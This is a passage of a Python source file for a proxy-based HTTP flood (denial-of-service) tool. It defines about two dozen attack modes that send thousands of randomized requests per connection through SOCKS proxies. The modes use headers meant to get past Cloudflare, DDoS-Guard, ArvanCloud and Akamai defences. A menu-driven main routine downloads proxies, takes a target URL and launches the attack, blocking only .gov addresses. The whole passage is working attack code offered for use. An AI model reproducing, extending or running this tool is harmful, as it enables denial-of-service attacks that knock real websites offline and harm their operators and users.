			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(1)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send(f"GET /?{Intn(0, 2000)} HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))
			s.send(f"User-Agent: {getuseragent()}\r\n".encode("utf-8"))
			s.send(b"Accept-language: en-US,en,q=0.5\r\n")
			if cookies:
				s.send(f"Cookies: {cookies}\r\n".encode("utf-8"))
			s.send(b"Connection:keep-alive")
			socket_list.append(s)
		except:
			pass
	while True:
		for s in list(socket_list):
			try:
				s.send(f"X-a: {Intn(1, 5000)}\r\n".encode("utf-8"))
				stats.add_request(20)
			except:
				try:
					socket_list.remove(s)
					s.close()
				except:
					pass

def cfb(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def null(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: \r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def cookie(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				random_cookie = f"id={Intn(1, 999999)}; session={randomurl()}; __cfruid={randomurl()}"
				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nCookie: {random_cookie}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def pps(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(1000):
				req = "GET / HTTP/1.1\r\n\r\n"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
			ind_rlock.release()
		except:
			stats.add_error()

def even(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				extra_headers = f"X-Custom-1: {randomurl()}\r\nX-Custom-2: {randomurl()}\r\nX-Custom-3: {randomurl()}\r\nX-Custom-4: {randomurl()}\r\n"
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{extra_headers}{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def gsb(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def dgb(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def avb(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("arvancloud_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def bot(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def apache(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("apache_bypass")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def xmlrpc(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(200):
				payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 200
			ind_rlock.release()
		except:
			stats.add_error()

def cfbuam(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}CF-UAM-Bypass: 1\r\n{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def bypass(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(500):
				bypass_headers = apply_ultra_bypass_headers(Choice(list(ULTRA_BYPASS_HEADERS.keys())))
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
			ind_rlock.release()
		except:
			stats.add_error()

def killer(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(2000):
				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 2000
			ind_rlock.release()
		except:
			stats.add_error()

def advanced(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	bypass_types = list(ULTRA_BYPASS_HEADERS.keys())
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(1000):
				bypass_type = Choice(bypass_types)
				bypass_headers = apply_ultra_bypass_headers(bypass_type)
				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
			ind_rlock.release()
		except:
			stats.add_error()

def amplify(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(1000):
				payload = "data=" + "A"*30000
				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
			ind_rlock.release()
		except:
			stats.add_error()

def hybrid(event,socks_type,ind_rlock):
	proxy = Choice(proxies).strip().split(":")
	add = "?" if "?" not in path else "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(2)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			for n in range(800):
				if n % 2 == 0:
					bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
				else:
					payload = f"id={Intn(1,999999)}&data={randomurl()}"
					bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
					req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
				sent = s.send(str.encode(req))
				stats.add_request(sent)
				if not sent: break
			s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 800
			ind_rlock.release()
		except:
			stats.add_error()

def tor(conn,socks_type):
	proxy = Choice(proxies).strip().split(":")
	for _ in range(conn):
		try:
			s = socks.socksocket()
			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			s.settimeout(1)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n".encode("utf-8"))
			socket_list.append(s)
		except:
			pass
	while True:
		for s in list(socket_list):
			try:
				s.send(f"X-tor: {Intn(1, 5000)}\r\n".encode("utf-8"))
				stats.add_request(20)
			except:
				try:
					socket_list.remove(s)
					s.close()
				except:
					pass

def prevent():
	if '.gov' in url :
		print("~ You can't attack .gov website!")
		exit()
	
def main():
	global multiple
	global choice
	global data
	global mode2
	global cookies
	global brute
	global url
	global proxies
	
	modes_list = ["cc", "post", "head", "ovh", "rhex", "stomp", "stress", "dyn", "downloader", 
				  "slow", "cfb", "null", "cookie", "pps", "even", "gsb", "dgb", "avb", 
				  "bot", "apache", "xmlrpc", "cfbuam", "bypass", "killer", "tor", "advanced",
				  "amplify", "hybrid", "cannon", "turbo", "overdrive"]
	
	print(f"\n{Fore.LIGHTMAGENTA_EX}Available Modes:{Fore.RESET}")
	print(f"{Fore.CYAN}cc/post/head/ovh/rhex/stomp/stress/dyn/downloader/slow/cfb/null/cookie/pps/even/gsb/dgb/avb/bot/apache/xmlrpc/cfbuam/bypass/killer/tor/advanced/amplify/hybrid/cannon/turbo/overdrive{Fore.RESET}\n")
	
	# Download real proxies
	proxies = download_real_proxies()
	
	if not proxies:
		print(f"{Fore.LIGHTRED_EX}[!] No proxies downloaded! Trying manual input...{Fore.RESET}")
		proxy_file = input(f"{Fore.CYAN}[?] Enter proxy file path: {Fore.RESET}")
		try:
			proxies = [p.strip() for p in open(proxy_file).readlines() if p.strip() and ':' in p]
		except:
			print(f"{Fore.LIGHTRED_EX}[!] Cannot read proxy file!{Fore.RESET}")
			return
	
	if len(proxies) < 10:
		print(f"{Fore.LIGHTYELLOW_EX}[!] Warning: Only {len(proxies)} proxies available. Recommended: 100+{Fore.RESET}")
	
	mode = InputOption("~ Choose Your Mode (default=cannon) :", modes_list, "cannon")
	url = str(input(f"{Fore.CYAN}~ Input the target url:{Fore.RESET} ")).strip()
	prevent()
	ParseUrl(url)
	
	if mode == "post":
		mode2 = InputOption("~ Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("~ Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	
	choice2 = InputOption("~ Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("Please input the cookies:")).strip()
	
	choice = InputOption("~ Choose your socks mode(4/5, default=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	
	if mode in ["slow", "tor"]:	
		thread_num = str(input(f"{Fore.CYAN}~ Connections(default=2000):{Fore.RESET} "))
	else:
		thread_num = str(input(f"{Fore.CYAN}~ Threads(default=10000):{Fore.RESET} "))
	
	if thread_num == "":
		thread_num = int(10000) if mode not in ["slow", "tor"] else int(2000)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("Error thread number")
	
	if len(proxies) == 0:
		print(f"{Fore.LIGHTRED_EX}~ There are no more proxies. Please download a new one.{Fore.RESET}")
		return
	
	ind_rlock = threading.RLock()
	
	print(f"\n{Fore.LIGHTGREEN_EX}{'='*70}")
	print(f"{'ATTACK CONFIGURATION':^70}")
	print(f"{'='*70}")
	print(f"Method....................: {Fore.LIGHTYELLOW_EX}{mode.upper()}{Fore.RESET}")
	print(f"Target....................: {Fore.LIGHTYELLOW_EX}{target}:{port}{Fore.RESET}")
	print(f"Threads....................: {Fore.LIGHTYELLOW_EX}{thread_num}{Fore.RESET}")
	print(f"Proxies....................: {Fore.LIGHTYELLOW_EX}{len(proxies)}{Fore.RESET}")
	print(f"Bypass System.............: {Fore.LIGHTYELLOW_EX}ULTRA MULTI-LAYER{Fore.RESET}")
	print(f"{Fore.LIGHTGREEN_EX}{'='*70}{Fore.RESET}\n")
	
	if mode in ["slow", "tor"]:
		input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start...{Fore.RESET}")
		th = threading.Thread(target=slow if mode=="slow" else tor, args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input(f"{Fore.CYAN}~ Magnification(default=100):{Fore.RESET} "))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input(f"{Fore.CYAN}~ Enable boost mode[beta](y/n, default=y):{Fore.RESET} "))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		elif brute == "n":
			brute = False
		event = threading.Event()
		print(f"{Fore.LIGHTCYAN_EX}[*] Building {thread_num} threads...{Fore.RESET}")
		SetupIndDict()
		build_threads(mode, thread_num, event, socks_type, ind_rlock)
		event.clear()
		input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start attack...{Fore.RESET}")
		event.set()
		print(f"\n{Fore.LIGHTRED_EX}{'🔥 ATTACK STARTED - ULTRA FIREPOWER 🔥':^70}{Fore.RESET}\n")
		threading.Thread(target=OutputToScreen, args=(ind_rlock,), daemon=True).start()
	
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			print(f"\n\n{Fore.LIGHTYELLOW_EX}{'='*70}")
			print(f"{'ATTACK STOPPED':^70}")
			stat = stats.get_stats()
			print(f"{'='*70}")
			print(f"Total Requests: {stat['requests']:,}")
			print(f"Peak RPS: {stat['peak_rps']:,.0f}")
			print(f"Data Sent: {stat['mbps']:.2f} MB/s")
			print(f"Success Rate: {stat['success_rate']:.1f}%")
			print(f"{'='*70}{Fore.RESET}\n")
			break

if __name__ == "__main__":
	try:
		main()
	except Exception as e:
		print(f"{Fore.LIGHTRED_EX}[!] Error: {e}{Fore.RESET}")